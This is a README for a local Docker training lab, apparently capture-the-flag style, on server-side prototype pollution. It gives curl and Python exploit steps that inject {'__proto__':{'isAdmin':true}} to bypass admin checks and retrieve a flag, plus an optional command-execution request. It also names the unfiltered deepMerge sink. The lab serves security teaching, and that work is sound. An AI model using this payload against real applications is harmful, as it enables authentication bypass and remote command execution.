# Prototype Pollution Lab (Docker)

Server-side deep merge of JSON without blocking `__proto__` → `isAdmin` on prototype → admin flag (+ optional RCE).

```bash
# from labs/
./labctl.sh up prototype-pollution
```

| Item | Value |
|------|--------|
| Host URL | http://127.0.0.1:8114 |
| Skill | Server-side prototype pollution → auth bypass |
| Flag | `OSWE{prototype_pollution_lab_flag}` |

## Exploit

```bash
# 1) Pollute Object.prototype.isAdmin
curl -s -X POST http://127.0.0.1:8114/api/prefs \
  -H 'Content-Type: application/json' \
  -d '{"__proto__":{"isAdmin":true}}'

# 2) Admin page (inherits isAdmin)
curl -s http://127.0.0.1:8114/admin
# → FLAG: OSWE{prototype_pollution_lab_flag}

# 3) Optional RCE as "admin"
curl -s 'http://127.0.0.1:8114/admin/exec?cmd=id'
```

## White-box

- Sink: `deepMerge(appConfig, body)` with no key filter
- Check: `appConfig.isAdmin` / empty object `.isAdmin` after pollution
- Source: `server.js` in this directory

## PoC sketch

```bash
python3 - <<'PY'
import requests
b = "http://127.0.0.1:8114"
requests.post(b+"/api/prefs", json={"__proto__": {"isAdmin": True}})
print(requests.get(b+"/admin").text)
PY
```

## Notes

Teaching clone only — not a full production app. See `guides/Prototype-Pollution-Methodology.md`.
